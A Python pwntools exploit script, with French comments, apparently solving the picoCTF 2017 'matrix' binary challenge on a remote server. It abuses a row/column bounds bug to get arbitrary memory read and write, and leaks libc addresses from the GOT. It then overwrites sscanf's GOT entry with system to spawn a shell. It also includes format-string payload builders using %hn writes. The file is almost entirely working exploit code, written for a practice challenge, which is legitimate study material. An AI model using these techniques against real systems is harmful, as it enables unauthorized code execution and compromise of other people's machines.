#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
binaire='matrix'

if (len(sys.argv)>1):
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='localhost'
    port=59994
else:
    elf=ELF(binaire)
    libc=ELF('libc-chall.so.6')
    host='shell2017.picoctf.com'
    port=37838

def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)



def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)
# routine de format

def strl(n,l=5):
    s=str(n)
    s="0"*max(0,l-len(s))+s
    return(s)

def fmt(x):
    if (x < 8):
        return("A"*x)
    return("%"+str(x)+"x")


def lchaine(lwhat,offset,nb=4):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$hn"
    for c in lnom:
        fm=fmt(c[0]-ind)+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

def lchaineverif(lwhat,offset,nb=4):
    if (nb==4):
        vv='8x'
    else:
        vv='lx'
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$"+vv
    for c in lnom:
        fm="F"*len(fmt(c[0]-ind))+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

debug=1

def pdebug(s):
    if (debug==1):
        print s
    return(s)

def tolibc(s):
    return(libc.sym[s]-libc.sym[reference_libc]+adr_reference_libc)

def whatis(s):
    print s," = ",hex(tolibc(s))


############


def lireoffset(i):
    p.send("%"+str(i)+"$08x\n")
    time.sleep(TIME)
    b=p.recvuntil("Password: ")
    return(b[0:8])


def lireptroffset(i):
    p.send("%"+str(i)+"$s\n")
    time.sleep(TIME)
    b=p.recvuntil("Password: ")
    return(b[:b.index(" is incorrect")])


def getzone(a):
    p.sendline(p32(a)+"%7$s")
    b=p.recvuntil("Password: ")
    fin=b.index(" is incorrect")
    return(b[4:fin])

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)


p=remote(host,port)
p.recvuntil("command: ")

from pwnfloat import *

def docmd(c):
    p.sendline(c)
    return(p.recvuntil("command: "))

def create(l,c):
    docmd("create "+str(l)+" "+str(c))

def destroy(n):
    docmd("destroy "+str(n))

def set(m,l,c,v):
    docmd("set "+str(m)+" "+str(l)+" "+str(c)+" "+str(unpackfloat(p32(v))))

def get(m,l,c):
    return(docmd("get "+str(m)+" "+str(l)+" "+str(c)))

# la vulnerabilité vient du fait que il y a rows au lieu de columns dans le set

create(7,5)
create(1,1)

# à ce stade on peut lire et écrire

def lire(m):
    set(0,5,3,m)
    b=get(1,0,0)
    ind=b.index("trix[0][0] = ")+13
    indf=b.index("\n")
    return(word(packfloat(float(b[ind:indf]))))

def ecrire(m,quoi):
    set(0,5,3,m)
    set(1,0,0,quoi)

# 1) fuite libc

def libcof(s):
    print s," = ",hex(lire(elf.got[s]))
    
reference_libc='printf'
adr_reference_libc=lire(elf.got['printf'])
print "[+] fuite libc"
print reference_libc," = ",hex(adr_reference_libc)
libcof('puts')
libcof('fgets')
libcof('__isoc99_sscanf')
libcof('exit')
whatis('system')

#2) remplacement sscanf par system

ecrire(elf.got['__isoc99_sscanf'],tolibc('system'))
p.sendline("/bin/sh")
#3) let's go

p.interactive()
p.close()
